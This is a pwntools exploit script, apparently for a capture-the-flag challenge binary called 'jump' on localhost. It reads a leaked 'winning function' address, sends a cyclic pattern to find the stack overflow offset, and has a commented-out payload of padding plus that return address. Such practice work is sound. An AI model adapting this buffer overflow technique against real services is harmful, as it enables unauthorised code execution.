#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./jump --host localhost --port 5001
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./jump')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 5001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()
start = len("The winning function is at ");
winningFunctionLine = io.recvline();
winningFunctionAddr = winningFunctionLine[start:]
print(winningFunctionLine)
print('Winning Address: '+winningFunctionAddr)
io.recvline()

#payload = cyclic(512)
address = p32(int(winningFunctionAddr,16))
#garbage = '\x61'*64
#payload = garbage+address
payload = cyclic(100);
print(payload);
io.sendline(payload)
jumpTo = io.recvline()

print(jumpTo)
start = len("Preparing to jump to ") + 2
leakedAddress = unhex(jumpTo[start:])
print(cyclic_find(leakedAddress))

io.interactive()
